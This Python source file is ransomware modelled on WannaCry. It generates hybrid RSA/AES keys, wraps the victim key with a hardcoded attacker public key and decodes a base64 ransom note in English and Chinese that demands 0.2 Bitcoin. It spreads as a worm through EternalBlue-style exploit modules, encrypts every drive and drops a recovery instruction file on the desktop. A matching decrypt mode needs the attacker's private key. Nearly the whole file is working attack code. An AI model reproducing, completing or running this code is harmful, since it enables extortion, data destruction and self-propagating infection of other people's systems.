from __future__ import print_function
import os
import sys
import rsa
import random

from threading import Thread

from lib.system_manager import check_os, get_hosts_ip, get_drives
from lib.en_decrypt import Encrypt, Decrypt, rsa_long_encrypt, rsa_long_decrypt
from lib.eternal_checker import checker
from lib.zzz_exploit import exp_main

from base64 import b64encode
from base64 import b64decode
from ctypes import windll

def npass(length):
    if not isinstance(length, int) or length < 8:
        raise ValueError("temp password must have positive length")

    chars = "abcdefghijklmnopqrstvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    x = os.urandom(length)
    x = x.decode('latin1')
    return "".join(chars[ord(c) % len(chars)] for c in x)

def generated():
    hack_rsa_public_key = b'''-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAxGPCOPxi681i9U3JGlGMJFyaXCBa4MI22om4PFZYs1kAB8wijvgq
fRBd4AU377MSVt/wDWffqmsxFXgr21LQi6DjUPh2qjQMUNXpGS5HVepRe+CQMDHo
hmCA3yZJybAvbQC99pQg5hzZdsDJDN/ZhHB2+Lt71VWpVP9MLBKszF23IRZVGvHU
nl4ghtQDAQEjY06QCBR9xe4dgZzZnpQnvo0Cgxo3MiMa1nFQusY6URs6FvG8fu0H
p8YbZ+1jdWEz7bz6O0RyejPQGWW6cFcX0eMEkivwOjfyd4n8py/VYKnivUnUeK3R
/kXZ5Zf/x658bm4J/QqHryk/cN+SaTHC8wIDAQAB
-----END RSA PUBLIC KEY-----'''
    (pubkey, privkey) = rsa.newkeys(2048)
    pub = pubkey.save_pkcs1()
    priv = privkey.save_pkcs1()
    aes_key = npass(16)
    en_aes_key = b64encode(rsa_long_encrypt(pub, aes_key.encode())).decode()
    en_privkey = b64encode(rsa_long_encrypt(hack_rsa_public_key, priv)).decode()
    return (aes_key, en_aes_key, en_privkey)

def get_en_msg_key():
    aes_key, uid, privkey = generated()

    address = 'Your BTC address'

    email = 'Your email'

    msg ="77u/RU5HTElTSDoKI1doYXQgaGFwcGVuZWQ/CkFMTCB5b3VyIGltcG9ydGFudCBmaWxlcyhkYXRhYmFzZSxkb2N1bWVudHMsaW1hZ2VzLHZpZGVvcyxtdXNpYyxldGMuKWhhdmUgYmVlbiBlbmNyeXB0ZWQhCkFuZCBvbmx5IHdlIGNhbiBkZWNyeXB0IQpUbyBkZWNyeXB0IHlvdXIgZmlsZXMseW91IG5lZWQgdG8gYnV5IHRoZSBkZWNyeXB0aW9uIGtleSBmcm9tIHVzLgpXZSBhcmUgdGhlIG9ubHkgb25lIHdobyBjYW4gZGVjcnlwdCB0aGUgZmlsZSBmb3IgeW91LgoKI0F0dGVudGlvbiEKVHJ5aW5nIHRvIHJlaW5zdGFsbCB0aGUgc3lzdGVtIGFuZCBkZWNyeXB0aW5nIHRoZSBmaWxlIHdpdGggYSB0aGlyZC1wYXJ0eSB0b29sIHdpbGwgcmVzdWx0CmluIGZpbGUgY29ycnVwdGlvbix3aGljaCBtZWFucyBubyBvbmUgY2FuIGRlY3J5cHQgeW91ciBmaWxlLihpbmNsdWRpbmcgdXMpLAppZiB5b3Ugc3RpbGwgdHJ5IHRvIGRlY3J5cHQgdGhlIGZpbGUgeW91cnNlbGYseW91IGRvIHNvIGF0IHlvdXIgb3duIHJpc2shCgojVGVzdCBkZWNyeXB0aW9uIQpBcyBhIHByb29mLHlvdSBjYW4gZW1haWwgdXMgMyBmaWxlcyB0byBkZWNyeXB0LAphbmQgd2Ugc3RpbGwgc2VuZCB5b3UgdGhlIHJlY292ZXJlZCBmaWxlcyB0byBwcm92ZSB0aGF0IHdlIGNhbiBkZWNyeXB0IHlvdXIgZmlsZXMuCgojSG93IHRvIGRlY3J5cHQ/CjEuQnV5ICgwLjIpIEJpdGNvaW4uCjIuU2VuZCAoMC4yKSBCaXRjb2luIHRvIHRoZSBwYXltZW50IGFkZHJlc3MuCjMuRW1haWwgeW91ciBJRCB0byB1cyxhZnRlciB2ZXJpZmljYXRpb24sd2Ugd2lsbCBjcmVhdGUgYSBkZWNyeXB0aW9uIHRvb2wgZm9yIHlvdS4KClJlbWVtYmVyLGJhZCB0aGluZ3MgaGF2ZSBoYXBwZW5lZCxub3cgbG9vayBhdCB5b3VyIGRldGVybWluYXRpb24gYW5kIGFjdGlvbiEKCllvdXIgSUQ6I3VpZApFLW1haWw6I2VtYWlsClBheW1lbnQ6I2FkZHJlc3MKUHJpdmtleTojcHJpdmtleQoKCuS4reaWh++8mgoj5Y+R55Sf5LqG5LuA5LmIPwrmgqjmiYDmnInnmoTph43opoHmlofku7bvvIjmlbDmja7lupPjgIHmlofmoaPjgIHlm77lg4/jgIHop4bpopHjgIHpn7PkuZDnrYnvvInlt7LooqvliqDlr4bvvIHlubbkuJTlj6rmnInmiJHku6zmiY3og73op6Plr4bvvIEKCiPms6jmhI/kuovpobnvvIEK5bCd6K+V6YeN5paw5a6J6KOF57O757uf5bm25L2/55So56ys5LiJ5pa55bel5YW36Kej5a+G5paH5Lu25bCG5a+86Ie05paH5Lu25o2f5Z2P77yM6L+Z5oSP5ZGz552A5rKh5pyJ5Lq65Y+v5Lul6Kej5a+G5oKo55qE5paH5Lu2Cu+8iOWMheaLrOaIkeS7rO+8ie+8jOWmguaenOaCqOS7jeWwneivleiHquihjOino+WvhuaWh+S7tu+8jOWImemcgOiHquihjOaJv+aLhemjjumZqe+8gQoKI+a1i+ivleino+Wvhu+8gQrkvZzkuLror4HmmI7vvIzmgqjlj6/ku6XpgJrov4fnlLXlrZDpgq7ku7blkJHmiJHku6zlj5HpgIEz5Liq6KaB6Kej5a+G55qE5paH5Lu277yM5oiR5Lus5Lya5bCG5oGi5aSN5ZCO55qE5paH5Lu25Y+R6YCB57uZ5oKo77yMCuS7peivgeaYjuaIkeS7rOWPr+S7peino+WvhuaCqOeahOaWh+S7tuOAggoKI+WmguS9leino+WvhgoxLui0reS5sCAoMC4yKSDkuKrmr5TnibnluIEKMi7lsIYgKDAuMikg5LiqIOavlOeJueW4geWPkemAgeWIsOS7mOasvuWcsOWdgAozLuWwhuaCqOeahElE6YCa6L+H55S15a2Q6YKu5Lu25Y+R6YCB57uZ5oiR5Lus77yM57uP5qC45a6e5ZCO77yM5oiR5Lus5bCG5Li65oKo5Yi25L2c6Kej5a+G5bel5YW3Cgror7forrDkvY/vvIzmnIDlnY/nmoTkuovmg4Xlt7Lnu4/lj5HnlJ/kuobvvIznjrDlnKjlsLHnnIvmgqjnmoTlhrPlv4PlkozooYzliqjkuobvvIEKCuaCqOeahElE77yaI3VpZArpgq7nrrHlnLDlnYDvvJojZW1haWwK5LuY5qy+5Zyw5Z2A77yaI2FkZHJlc3MK6Kej5a+G56eB6ZKl77yaI3ByaXZrZXkK"
    msg = b64decode(msg)
    msg = msg.decode('utf-8')
    msg = msg.replace("#uid",uid)
    msg = msg.replace("#email",email)
    msg = msg.replace('#address',address)
    msg = msg.replace('#privkey',privkey)
    msg = msg.encode('utf-8')
    return (aes_key, msg)

def get_de_key():
    with open(sys.argv[2], "rb") as f:
        hack_rsa_privacy_key = f.read()

    en_aes_key = b64decode(input("Please your uid:"))
    en_user_rsa_privacy_key = b64decode(input("Please your privkey:"))

    user_rsa_privacy_key = rsa_long_decrypt(hack_rsa_privacy_key, en_user_rsa_privacy_key)
    aes_key = rsa_long_decrypt(user_rsa_privacy_key, en_aes_key).decode()

    return aes_key

def worm():
    # 蠕虫函数
    hosts = get_hosts_ip()
    if hosts:
        for ip in hosts:
            checker_out = checker(ip)
            if checker_out:
                exp_main(ip)

def main():
    # 主函数
    os_system = check_os() # 操作系统检测
    if len(sys.argv) == 2:
        if sys.argv[1]=='en': # 加密
            # 获取aes_key用于加密文件
            # 获取用于提示被勒索者的消息
            aes_key, msg = get_en_msg_key() 

            if os_system == 'windows':
                worm_t = Thread(target=worm)
                worm_t.start()
                drives = get_drives()
                # drives = [r"C:\Users\Lenovo\Desktop\wannacry"]
                for drive in drives:
                    t = Thread(target=Encrypt, args=(drive,msg,aes_key))
                    t.start()
                desk = os.path.join(os.path.expanduser("~"), 'Desktop') + "\\"
                back_file = desk + "HOW_TO_BACK_FILES.txt"
                if not os.path.exists(back_file):
                    with open(back_file, "wb") as f:
                        f.write(msg)
            else:
                t = Thread(target=Encrypt, args=("/",msg,aes_key))
                t.start()
    if len(sys.argv) == 3:
        # 解密
        if sys.argv[1]=='de' and os.path.isfile(sys.argv[2]):
            # 获取解密key
            aes_key = get_de_key()
            if os_system=='windows':
                drives = get_drives()
                # drives = [r"C:\Users\Lenovo\Desktop\wannacry"]
                for drive in drives:
                    t = Thread(target=Decrypt, args=(drive,aes_key))
                    t.start()
                desk = os.path.join(os.path.expanduser("~"), 'Desktop') + "\\"
                back_file = desk + "HOW_TO_BACK_FILES.txt"
                if os.path.exists(back_file):
                    os.remove(back_file)
            else:
                t = Thread(target=Decrypt, args=("/",aes_key))
                t.start()
    

if __name__ == '__main__':
    main()

